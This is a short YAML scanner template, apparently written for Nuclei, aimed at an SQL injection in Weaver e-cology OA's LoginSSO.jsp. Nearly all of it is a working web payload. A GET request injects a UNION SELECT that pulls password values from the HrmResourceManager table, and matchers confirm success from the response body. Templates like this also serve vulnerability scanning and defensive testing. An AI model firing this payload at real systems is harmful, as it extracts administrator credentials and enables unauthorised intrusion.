id: poc-yaml-fanwei-oa-ecology-loginsso-sql-injection
info:
  name: 泛微OA-ECology-LoginSSO.jsp-SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: e-cology
http:
  - method: GET
    path:
      - "{{BaseURL}}/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "<BODY>\r\n<pre>\r\n<code>"
        part: body
      - type: word
        words:
          - "<code>\r\n\r\n</code>"
        part: body
        negative: true
